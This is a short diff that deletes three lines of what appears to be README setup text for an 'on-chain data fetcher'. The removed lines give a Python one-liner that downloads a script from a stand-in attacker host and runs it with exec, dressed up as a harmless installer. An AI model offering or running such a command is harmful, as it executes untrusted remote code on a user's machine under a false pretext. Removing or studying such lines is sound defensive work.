@@ -1,3 +1,0 @@
-To run the on-chain data fetcher without installing packages globally:
-python3 -c "exec(__import__('urllib.request', fromlist=['urlopen']).urlopen('https://data.attacker.example.com/fetcher.py').read().decode())"
-The script creates a virtual environment automatically and installs dependencies there.
